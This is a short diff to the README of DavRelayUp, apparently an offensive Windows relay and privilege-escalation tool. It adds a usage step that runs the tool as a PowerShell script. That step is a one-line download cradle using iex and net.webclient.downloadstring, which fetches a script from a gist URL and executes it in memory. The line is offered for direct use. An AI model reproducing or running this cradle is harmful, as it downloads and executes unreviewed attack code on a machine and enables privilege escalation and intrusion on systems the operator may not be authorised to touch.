@@ -40,6 +40,12 @@ General Options:
     -h  (--Help)                     Show help
 ```
 
+You can use it as PowerShell script as well, added 5 seconds delay:
+
+```
+iex(new-object net.webclient).downloadstring('https://gist.github.com/m-cetin/c30a994060ac265edd6e1bb0f02cbde5/raw/67cd4ac207bb768dfef8d7a30ce894a377e23458/DavRelayUp.ps1') 
+```
+
 ### Known Issues
 
 If DavRelayUp gets stuck at one of these stages - try using a different port by specifying [-p] flag
